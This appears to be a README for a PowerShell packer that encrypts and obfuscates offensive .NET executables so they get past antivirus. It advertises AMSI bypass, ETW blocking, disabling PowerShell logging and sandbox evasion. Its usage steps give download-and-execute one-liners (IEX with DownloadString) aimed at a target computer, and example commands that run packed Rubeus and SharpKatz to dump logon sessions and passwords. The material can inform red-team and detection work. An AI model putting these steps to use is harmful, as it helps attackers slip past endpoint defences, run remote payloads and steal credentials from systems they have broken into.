### Invoke-PoSH-CsharpPacker
--------------------------------------
'Invoke-PoSH-CsharpPacker' allows to pack and encrypt offensive (C#) .NET executable files in order to bypass AV solutions such as Windows Defender.
It generates an obfuscated and encrypted PowerShell script that contains the (C#) .NET executable file that you want to pack.

#### FEATURES
  - AES encryption and GZip/Deflate compression (based on 'Xencrypt')
  - AMSI bypass <i/>(bypass AMSI for Assembly.Load())</i>
  - Blocking Event Tracing for Windows (ETW)
  - Disabling PowerShell history logging
  - Basic sandbox evasion techniques (optional)
    - stop/exit if the PowerShell script is not run on a domain-joined Windows computer 
    - stop/exit if the PowerShell session is being debugged (detection based on "Test-Path Variable:PSDebugContext")
    - wait for 60 seconds before execution
  
#### USAGE
  - STEP 1. Generate an obfuscated & encrypted PowerShell script that contains your (C#) .NET executable file (e.g. Rubeus.exe, Sharpkatz.exe) stored locally or on a remote web server.  
```
[*] First load the packer
    PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JFR-C/Windows-Penetration-Testing/master/Defense%20evasion%20(examples)/Invoke-PoSH-SharpPacker/Invoke-PoSH-CsharpPacker.ps1');

[*] Then "pack/obfuscate" a (C#) .NET executable file stored locally (with or without the sandbox checks enabled)
    PS C:\> Invoke-PoSH-CsharpPacker -FilePath C:\path\Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1
    --- or ---
    PS C:\> Invoke-PoSH-CsharpPacker -FilePath C:\path\Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1 -Sandbox

[*] Or download and "pack/obfuscate" a (C#) .NET executable file stored stored on a remote web server (with or without the sandbox checks enabled)
    PS C:\> Invoke-PoSH-CsharpPacker -FileUrl https://URL/Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1 
    --- or ---
    PS C:\> Invoke-PoSH-CsharpPacker -FileUrl https://URL/Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1 -Sandbox
```
#### 
  - STEP 2. Download & execute the obfuscated & encrypted PowerShell script (that contains your (C#) .NET executable file) on a target Windows computer
```
PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://URL/Packed-Csharp-binary.ps1');

--- or (not recommended) ---
PS C:\> WGET -URI https://URL/Packed-Csharp-binary.ps1 -OutFile C:\temp\Packed-Csharp-binary.ps1
PS C:\> Import-Module C:\temp\Packed-Csharp-binary.ps1
``` 
#### 
  - STEP 3. Execute the packed version of your (C#) .NET executable file   
    - Generic command: ``` PS C:\> Invoke-Packed-NET-Executable argument1 argument2 argument3 ...``` 
    - Exemple with a packed version of Rubeus.exe: ```Invoke-Packed-NET-Executable logonsession /current```  
    - Example with a packed version of Sharpkatz.exe: ```Invoke-Packed-NET-Executable --Command logonpasswords``` 
    - Note: if you encounter errors while using a long command with multiple parameters, put the parameters in a powershell variable ;-)

#### LICENSE
  - GNU General Public License v3.0
